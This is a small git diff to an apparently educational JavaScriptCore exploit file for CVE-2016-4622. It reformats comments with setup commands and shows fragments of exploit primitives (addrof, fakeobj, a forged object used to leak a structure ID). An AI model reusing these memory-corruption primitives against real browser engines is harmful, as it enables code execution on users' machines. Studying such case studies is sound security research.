@@ -82,7 +82,7 @@ function leak_structureID(obj, addrof, fakeobj) {
         u32[0] = u32[1];
 
         let fake_name = {
-        a : 0,      // |       flags      |      useless      |
+                a : 0,      // |       flags      |      useless      |
                 b: f64[1],  // | Low 32bit of obj |       length      |
                 c: f64[0]   // |      useless     | High 32bit of obj |
         };
@@ -107,9 +107,10 @@ function leak_structureID(obj, addrof, fakeobj) {
 /****************************************************************************************
 // CVE-2016-4622
 // https://github.com/y0ny0ns0n/JavaScriptCore-Case-Study#cve-list
-// mega-get https://mega.nz/#!1ypkjAbY!hd2y5BfvmcOPs9a5nboIxFRth184UdP1rsbxZmzjdQ0 .
-// unzip CVE-2016-4622.zip -d CVE-2016-4622 && cd CVE-2016-4622
-// LD_LIBRARY_PATH=./lib bin/jsc for_jsc.js
+
+// $ mega-get https://mega.nz/#!1ypkjAbY!hd2y5BfvmcOPs9a5nboIxFRth184UdP1rsbxZmzjdQ0 .
+// $ unzip CVE-2016-4622.zip -d CVE-2016-4622 && cd CVE-2016-4622
+// $ LD_LIBRARY_PATH=./lib bin/jsc for_jsc.js
 
 function addrof(obj) {
         let a = [];
